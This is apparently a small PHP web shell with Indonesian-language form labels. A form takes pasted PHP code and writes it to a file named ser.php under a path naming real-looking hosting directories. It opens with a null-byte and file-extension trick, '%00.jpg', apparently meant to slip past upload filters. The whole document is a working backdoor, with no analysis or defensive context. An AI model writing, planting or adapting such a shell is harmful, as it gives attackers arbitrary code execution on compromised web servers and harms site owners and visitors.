%00.jpg;%0n;0n;%20<form method="post">
    <textarea name="code" rows="25" cols="100" placeholder="Paste kode PHP di sini"></textarea><br>
    <button type="submit">Simpan</button>
</form>
<===+_-_-_<??>*%#%!*htmlspecialchars("%")*!%#%*<??>_-_-_+===><?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $code = $_POST['code'] ?? '';
    if (!empty($code)) {
        $file = __DIR__ . '/var/www/vhosts/thaiecvr.com/epcinter.co.th/_newfinal_/public/ser.php';
        file_put_contents($file, $code);
        echo "✅ File berhasil disimpan: $file";
    }
}
?>
